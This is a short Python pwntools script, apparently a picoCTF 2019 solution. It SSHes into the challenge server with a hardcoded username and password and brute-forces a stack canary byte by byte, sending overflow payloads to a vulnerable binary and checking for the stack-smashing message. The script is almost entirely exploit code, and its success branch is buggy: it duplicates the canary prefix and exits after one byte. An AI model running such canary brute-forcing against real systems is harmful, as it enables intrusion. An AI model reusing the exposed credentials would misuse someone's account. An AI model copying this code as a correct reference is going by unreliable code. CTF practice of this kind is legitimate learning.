from pwn import *

re = ssh(host="2019shell1.picoctf.com", user="HomardBoy", password="merveille00")
vuln = re.process("vuln", cwd="/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0")

pad = "A" * 32
final_canary = "333"

for x in range (0, 256):
    canary = final_canary + chr(x)
    payload = pad + canary
    input_len = len(payload)

    vuln = re.process("vuln", cwd="/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0")
    vuln.sendlineafter(">", str(input_len))
    vuln.sendlineafter("Input>", payload)
    answer = vuln.recvall()
       
    if "*** Stack Smashing Detected *** : Canary Value Corrupt!" in str(answer):
         #vuln.close()
        continue 
    else:
        final_canary += str(canary)
        print("Canary bruteforce: " + str(final_canary))
        exit(1)
    #z += 1
#vuln.interactive()

# canary = 3XXX
